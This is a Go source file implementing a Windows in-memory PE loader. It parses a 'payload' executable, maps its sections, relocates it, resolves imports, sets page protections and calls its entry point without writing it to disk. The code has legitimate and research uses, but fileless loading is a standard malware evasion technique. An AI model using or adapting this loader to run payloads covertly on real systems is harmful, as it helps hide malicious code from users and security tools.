package gorunpe

import (
	"bytes"
	"fmt"
	"unsafe"
	"syscall"
	"gohttpmem/pkg/constants"
	"github.com/Binject/debug/pe"
	"golang.org/x/sys/windows"
)

func ExecuteInMemory(payload []byte) error {
	// 1. Load the PE file from memory
	reader := bytes.NewReader(payload)
	peFile, err := pe.NewFile(reader)
	if err != nil {
		return fmt.Errorf("PE parse error: %w", err)
	}

	// Validate payload size - check at least SizeOfHeaders is present
	var sizeOfHeaders uint32
	switch oh := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader32:
		sizeOfHeaders = oh.SizeOfHeaders
	case *pe.OptionalHeader64:
		sizeOfHeaders = oh.SizeOfHeaders
	default:
		return fmt.Errorf("unsupported PE optional header type")
	}

	if len(payload) < int(sizeOfHeaders) {
		return fmt.Errorf("invalid payload size: %d bytes. Minimum %d bytes expected for PE headers", 
			len(payload), sizeOfHeaders)
	}

	// 2. Extract important details from PE headers
	var imageBase uint64
	var sizeOfImage uint32
	var addressOfEntryPoint uint32

	switch oh := peFile.OptionalHeader.(type) {
	case *pe.OptionalHeader32:
		imageBase = uint64(oh.ImageBase)
		sizeOfImage = oh.SizeOfImage
		addressOfEntryPoint = oh.AddressOfEntryPoint
	case *pe.OptionalHeader64:
		imageBase = oh.ImageBase
		sizeOfImage = oh.SizeOfImage
		addressOfEntryPoint = oh.AddressOfEntryPoint
	default:
		return fmt.Errorf("unsupported PE optional header type")
	}

	// Validate sizeOfImage to prevent OOB errors
	const MAX_REASONABLE_SIZE = 512 * 1024 * 1024 // 512 MB max
	if sizeOfImage == 0 || sizeOfImage > MAX_REASONABLE_SIZE {
		return fmt.Errorf("invalid PE image size: %d bytes", sizeOfImage)
	}

	// 3. Allocate memory for the PE image with multiple strategies (like in the C++ code)
	var baseAddress uintptr
	var allocErr error

	// Strategy 1: Try to allocate at preferred base address
	baseAddress, allocErr = windows.VirtualAlloc(uintptr(imageBase), uintptr(sizeOfImage),
		windows.MEM_RESERVE|windows.MEM_COMMIT, 
		windows.PAGE_READWRITE)
	
	if allocErr != nil {
		// Strategy 2: Let the system choose an address
		baseAddress, allocErr = windows.VirtualAlloc(0, uintptr(sizeOfImage),
			windows.MEM_RESERVE|windows.MEM_COMMIT, 
			windows.PAGE_READWRITE)
		
		if allocErr != nil {
			// Strategy 3: Try reserve + commit in chunks
			var reserveErr error
			
			// First try at preferred base
			baseAddress, reserveErr = windows.VirtualAlloc(uintptr(imageBase), uintptr(sizeOfImage),
				windows.MEM_RESERVE, windows.PAGE_NOACCESS)
			
			if reserveErr != nil {
				// If that fails, let system choose
				baseAddress, reserveErr = windows.VirtualAlloc(0, uintptr(sizeOfImage),
					windows.MEM_RESERVE, windows.PAGE_NOACCESS)
				
				if reserveErr != nil {
					return fmt.Errorf("all memory allocation strategies failed: %w", reserveErr)
				}
			}
			
			// Commit memory in chunks
			const chunkSize = 64 * 1024 * 1024 // 64MB chunks
			remaining := uintptr(sizeOfImage)
			offset := uintptr(0)
			commitError := false
			
			for remaining > 0 && !commitError {
				size := remaining
				if size > chunkSize {
					size = chunkSize
				}
				
				_, err := windows.VirtualAlloc(baseAddress+offset, size,
					windows.MEM_COMMIT, windows.PAGE_READWRITE)
				
				if err != nil {
					// Don't return immediately, we'll free the reservation below
					commitError = true
					break
				}
				
				remaining -= size
				offset += size
			}
			
			if commitError {
				// Free the reservation and try again with system-chosen address
				// but only if we didn't already try that
				windows.VirtualFree(baseAddress, 0, windows.MEM_RELEASE)
				
				if uintptr(imageBase) == baseAddress {
					// We failed at preferred base, try system-chosen
					baseAddress, allocErr = windows.VirtualAlloc(0, uintptr(sizeOfImage),
						windows.MEM_RESERVE|windows.MEM_COMMIT, 
						windows.PAGE_READWRITE)
					
					if allocErr != nil {
						return fmt.Errorf("all memory allocation strategies failed: %w", allocErr)
					}
				} else {
					// We already tried system-chosen, give up
					return fmt.Errorf("chunked memory commit failed at system-chosen address")
				}
			}
		}
	}

	// Setup cleanup function in case of failure
	cleanup := func() {
		// Free allocated memory
		if baseAddress != 0 {
			windows.VirtualFree(baseAddress, 0, windows.MEM_RELEASE)
		}
	}

	// 4. Create memory destination slice for manipulation
	dest := unsafe.Slice((*byte)(unsafe.Pointer(baseAddress)), sizeOfImage)

	// 5. Copy PE headers
	copy(dest[:sizeOfHeaders], payload[:sizeOfHeaders])

	// 6. Copy sections to their proper virtual addresses
	sectionsWithData := 0
	for _, section := range peFile.Sections {
		// For BSS sections, VirtualSize can be > 0 but Size == 0 (no raw data)
		// We should still process them for proper memory layout, but there's no data to copy
		// The memory was already zero-initialized by VirtualAlloc
		
		// Skip if section has no virtual space reserved
		if section.VirtualSize == 0 {
			continue
		}
		
		// If section has raw data, copy it to memory
		if section.Size > 0 {
			// Get section data
			sectionData, err := section.Data()
			if err != nil {
				cleanup()
				return fmt.Errorf("failed to get data for section %s: %w", section.Name, err)
			}

			// Copy section data to its virtual address
			va := section.VirtualAddress
			copy(dest[va:va+uint32(len(sectionData))], sectionData)
			sectionsWithData++
		}
	}

	// 7. Apply relocations if needed
	newImageBase := uint64(baseAddress)
	if newImageBase != imageBase {
		if err := ApplyRelocations(peFile, dest, imageBase, newImageBase); err != nil {
			cleanup()
			return fmt.Errorf("relocation failed: %w", err)
		}
	}

	// 8. Resolve imports
	if err := ResolveImports(peFile, dest); err != nil {
		cleanup()
		return fmt.Errorf("import resolution failed: %w", err)
	}

	// 9. Set proper memory protections for each section
	for _, section := range peFile.Sections {
		if section.VirtualSize == 0 {
			continue
		}

		var protection uint32 = windows.PAGE_READONLY
		characteristics := section.Characteristics

		// Determine protection based on section characteristics (like in C++)
		if characteristics&constants.IMAGE_SCN_MEM_EXECUTE != 0 {
			if characteristics&constants.IMAGE_SCN_MEM_WRITE != 0 {
				// Some PEs rely on PAGE_EXECUTE_WRITECOPY for copy-on-write sections
				// We map all write+exec to EXECUTE_READWRITE for simplicity, but could be refined
				protection = windows.PAGE_EXECUTE_READWRITE
			} else {
				protection = windows.PAGE_EXECUTE_READ
			}
		} else if characteristics&constants.IMAGE_SCN_MEM_WRITE != 0 {
			// Could also differentiate between WRITECOPY and regular WRITE here
			// but we use standard READWRITE for simplicity
			protection = windows.PAGE_READWRITE
		}

		// Apply protection
		var oldProtect uint32
		va := baseAddress + uintptr(section.VirtualAddress)
		size := uintptr(section.VirtualSize)
		// Round up to page boundary
		size = ((size + constants.PAGE_SIZE - 1) / constants.PAGE_SIZE) * constants.PAGE_SIZE

		err := windows.VirtualProtect(va, size, protection, &oldProtect)
		if err != nil {
			cleanup()
			return fmt.Errorf("VirtualProtect failed for section %s: %w", section.Name, err)
		}
	}

	// 10. Call TLS callbacks if present
	if err := ExecuteTLSCallbacks(peFile, baseAddress); err != nil {
		cleanup()
		return fmt.Errorf("TLS callback execution failed: %w", err)
	}

	// 11. Execute entry point
	entryPoint := baseAddress + uintptr(addressOfEntryPoint)

	// At this point, we won't call cleanup since the execution takes over the process
	// Note: In a real secure loader, you might want a background goroutine to clean this up 
	// after a timeout or if execution doesn't properly take over
	
	// Call the entry point - this will likely never return as it takes over the process
	syscall.Syscall(entryPoint, 0, 0, 0, 0)

	// In case the call returns (unusual for EXEs but possible for DLLs)
	cleanup()
	return nil
}
